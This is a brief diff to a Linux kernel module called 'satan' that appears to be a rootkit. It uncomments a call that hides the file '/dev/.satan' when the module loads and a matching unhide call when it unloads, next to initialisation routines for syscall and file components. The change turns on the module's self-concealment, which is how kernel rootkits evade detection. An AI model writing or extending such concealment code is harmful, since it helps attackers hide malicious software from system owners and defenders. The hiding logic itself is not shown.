@@ -17,7 +17,7 @@ static int __init satan_init(void)
         satan_syscall_init();
         satan_file_init();
 
-//        satan_file_hide("/dev/.satan");
+        satan_file_hide("/dev/.satan");
 
         return 0;
 }
@@ -26,7 +26,8 @@ static void __exit satan_exit(void)
 {
         pr_info("satan: shutting down...\n");
 
-//        satan_file_unhide("/dev/.satan");
+        satan_file_unhide("/dev/.satan");
+
         satan_file_exit();
         satan_syscall_exit();
         satan_dev_exit();
